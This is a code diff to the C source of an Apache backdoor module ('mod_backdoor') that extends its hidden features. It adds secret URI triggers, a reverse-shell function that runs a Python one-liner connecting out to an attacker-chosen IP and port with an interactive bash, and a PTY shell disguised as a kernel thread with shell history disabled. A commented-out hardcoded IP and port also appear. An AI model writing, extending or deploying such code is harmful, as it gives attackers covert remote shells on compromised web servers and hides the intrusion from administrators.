@@ -44,6 +44,8 @@
 #define SOCKSWORD "/w41t1ngR00M"
 #define PINGWORD "/h0p3"
 #define SHELLWORD "/s4L4dD4ys"
+#define RESTARTWORD "/ALARMA"
+#define REVERSESHELL "/reverse"
 #define IPC "/tmp/mod_backdoor" //Change
 
 pid_t pid;
@@ -238,7 +240,7 @@ void shell(int socket) {
     if (spid < 0) {
         fprintf(stderr, "[-] Error: could not fork");
         exit(EXIT_FAILURE);
-    }else{
+    }else if (spid == 0){
 		char *argv[] = { "[kintegrityd/2]", 0 };
         char *envp[] = { "HISTFILE=", 0 };
 		close(input[1]);
@@ -251,64 +253,156 @@ void shell(int socket) {
 	}
 	return;
 }
+void restartApache(int socket){
+    int input[2];
+    int output[2];
+    int n, sr;
+    char buf[1024];
+    fd_set readset;
+    struct timeval tv;
+    pid_t spid;
 
-void shellPTY(int socket) {
+    pipe(input);
+    pipe(output);
 
-    struct termios terminal;
-    int terminalfd, n = 0;
-    pid_t pid;
-    char input[1024];
-    char output[1024];
-
-    // Creamos un nuevo proceso hijo que operará en un pseudoterminal
-    pid = forkpty(&terminalfd, NULL, NULL, NULL);
-
-    if (pid < 0) {
-        fprintf(stderr, "[-] Error: could not forkpty");
+    spid = fork();
+    if (spid < 0) {
+        fprintf(stderr, "[-] Error: could not fork");
         exit(EXIT_FAILURE);
-    }
-    else if (pid == 0) { // Estamos en el proceso hijo que tiene el PTY
-        //int input[2];
-        //int output[2];
-        int n, sr;
-        char buf[1024];
-        fd_set readset;
-        struct timeval tv;
-        pid_t spid;
-
-        pipe(input);
-        pipe(output);
-
-        char *argv[] = { "[kintegrityd/2]", 0 };
-        char *envp[] = { "HISTFILE=", 0 };
+    }else if (spid == 0){
+        //char *argv[] = { "[kintegrityd/2]", 0 };
+        //char *envp[] = { "HISTFILE=", 0 };
         close(input[1]);
         close(output[0]);
 
         dup2(socket, 0);
         dup2(socket, 1);
         dup2(socket, 2);
-        execve("/bin/sh", argv, envp);
+        //execve("/bin/sh", argv, envp);
+        char* args[] = {"/usr/bin/systemctl", "restart", "apache2", NULL};
+        //char* args[] = {"/usr/bin/touch","/root/bite.txt",NULL};
+        execve( args[0], args, NULL);
     }
-    else { // Proceso padre
-        // Atributos: sin ECHO
+
+    return;
+}
+
+void reverseShell(int socket,char* ip, char* port){
+    int input[2];
+    int output[2];
+    int n, sr;
+    char buf[1024];
+    fd_set readset;
+    struct timeval tv;
+    pid_t spid;
+
+    pipe(input);
+    pipe(output);
+
+    spid = fork();
+    if (spid < 0) {
+        fprintf(stderr, "[-] Error: could not fork");
+        exit(EXIT_FAILURE);
+    }else if (spid == 0){
+        //char *argv[] = { "[kintegrityd/2]", 0 };
+        //char *envp[] = { "HISTFILE=", 0 };
+        close(input[1]);
+        close(output[0]);
+
+        dup2(socket, 0);
+        dup2(socket, 1);
+        dup2(socket, 2);
+        //execve("/bin/sh", argv, envp);
+
+        /*char* args[] = {"/usr/bin/touch", "", NULL};
+        args[1] = malloc(2048);
+        sprintf(args[1],"/root/%s:%s",ip,port);*/
+
+        char* args[] = {"/usr/bin/python", "-c", "", NULL};
+        args[2] = (char*) malloc(2048);
+        sprintf(args[2],"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",ip,port);
+
+        execve( args[0], args, NULL);
+    }
+
+    return;
+}
+
+void shellPTY(int socket) {
+
+    struct termios terminal;
+    int terminalfd, n = 0, sr;
+    pid_t pid;
+    char input[2048];
+    char output[2048];
+
+    pid = forkpty(&terminalfd, NULL, NULL, NULL);
+
+    if (pid < 0) {
+        fprintf(stderr, "[-] Error: could not forkpty");
+        exit(EXIT_FAILURE);
+    }
+    else if (pid == 0) { // Child process
+
+        char *argv[] = { "[kintegrityd/2]", 0 };
+        char *envp[] = { "HISTFILE=", 0 };
+        /*close(input);
+        close(output);*/
+
+        /*dup2(socket, 0);
+        dup2(socket, 1);
+        dup2(socket, 2);*/
+        execve("/bin/sh", argv, envp);
+        //execlp("/bin/sh", "[kintegrityd/2]", envp);
+        //execlp("/bin/zsh", "[kworker:01]", NULL);
+        /*char* args[] = {"/bin/bash", "-i", NULL };
+        execlp( args[0], args, NULL);*/
+    }
+    else { // Father process
         tcgetattr(terminalfd, &terminal);
         terminal.c_lflag &= ~ECHO;
         tcsetattr(terminalfd, TCSANOW, &terminal);
 
-        // Utilizaremos select para comprobar si hay datos y enviarlos en un sentido u otro
         fd_set readfd;
-        for(;;) {
-            FD_ZERO(&readfd);
-            FD_SET(terminalfd, &readfd); // Si terminalfd tiene datos
-            FD_SET(1, &readfd); // Si el socket tiene datos
-            select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-            if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
-                n = read(terminalfd, &output, 1024);
-                if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
-                write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
+        pid_t fpid;
+
+        fpid = fork();
+        if (fpid < 0) {
+            fprintf(stderr, "[-] Error: could not fork the father of the son of the fork GOD NO");
+            exit(EXIT_FAILURE);
+        }else if (fpid == 0) {
+            for (;;) {
+                FD_ZERO(&readfd);
+                FD_SET(terminalfd,&readfd);
+                FD_SET(socket,&readfd);
+                // Bidirectionnal data transfer between 2 fd - terminalfd <--> socket
+                sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
+                if (sr) {
+                    if (FD_ISSET(terminalfd,&readfd)) {
+                        n = read(terminalfd,&output,2048);
+                        if (n <= 0){
+                            kill(pid,SIGKILL);
+                            //restartApache(socket);
+                            break;
+                        }else{
+                            write(socket,&output,n);
+                        }
+                    }
+                    if (FD_ISSET(socket,&readfd)) {
+                        n = read(socket,&input,2048);
+                        if (n <= 0){
+                            kill(pid,SIGKILL);
+                            //restartApache(socket);
+                            break;
+                        }else{
+                            write(terminalfd,&input,n);
+                        }
+                    }
+                }
             }
         }
     }
+    return;
 }
 
 
@@ -354,6 +448,59 @@ static int backdoor_post_read_request(request_rec *r) {
 		write(fd, "Alive!", strlen("Alive!"));
 		exit(0);
 	}
+    if (!strcmp(r->uri, RESTARTWORD)) {
+        char buf[1024];
+        int sd[2], i;
+        sock = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (sock < 0) {
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            exit(0);
+        }
+        server.sun_family = AF_UNIX;
+        strcpy(server.sun_path, IPC);
+        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
+            close(sock);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            exit(0);
+        }
+
+        write(fd, "[+]Restarting Apache2!", strlen("[+]Restarting Apache2!"));
+        write(sock,"APACHE",strlen("APACHE"));
+        exit(0);
+    }
+
+    if (strstr(r->uri, REVERSESHELL)) {
+        char buf[1024];
+        int sd[2], i;
+        sock = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (sock < 0) {
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            exit(0);
+        }
+        server.sun_family = AF_UNIX;
+        strcpy(server.sun_path, IPC);
+        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
+            close(sock);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            exit(0);
+        }
+        write(sock,r->uri,strlen(r->uri));
+        exit(0);
+        //write(fd,r->uri,strlen(r->uri));
+        //write(fd,"coucou",strlen("coucou"));
+
+
+        // reverse/ip/port
+        /*char* reverse = strsep(r->uri,"/");
+
+        char* port = strsep(r->uri,"-");*/
+        /*char* bitur = malloc(2048);
+        sprintf(bitur,"%s:%s",ip,port);
+        write(fd,bitur,strlen(bitur));*/
+
+       /* exit(0);*/
+    }
+
 	if (!strcmp(r->uri, SHELLWORD)) {
 		if (pid) {
 			char buf[1024];
@@ -371,11 +518,13 @@ static int backdoor_post_read_request(request_rec *r) {
 				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
 				exit(0);
 			}
+
 			write(sock, "SHELL\n", strlen("SHELL\n") + 1);
 			write(fd, "[+] Shell Mode\n", strlen("[+] Shell Mode\n") +1);
 			sd[0] = sock;
 			sd[1] = fd;
 
+			//Bidirectional write client <--> IPC (--> to forked root apache2 process)
 			while (1){
 				for(i = 0; i < 2; i++) {
 					tv.tv_sec = 2;
@@ -466,7 +615,7 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 				}
 			}
 		}
-
+        // Check for IPC socket, if contain SHELL, launch shellPTY(sd)
 		for (i = 0; i < max_clients; i++) {
 			sd = clients[i];
 			if (FD_ISSET(sd, &readfds)) {
@@ -478,6 +627,18 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 				else  {
 					if (strstr(buf, "SHELL")){
 						shellPTY(sd);
+					}else if (strstr(buf, "APACHE")){
+					    restartApache(sd);
+					}else if(strstr(buf, "reverse")){
+                        char* meh = strtok(buf,"/");
+                        char* ip = strtok(NULL,"/");
+                        char* port = strtok(NULL,"/");
+
+					    reverseShell(sd,ip,port);
+					    /*char ip[] = "51.15.5.237";
+					    char port[] ="5555";*/
+					    //write(sd,ip,strlen(ip));
+
 					}
 				}
 			}
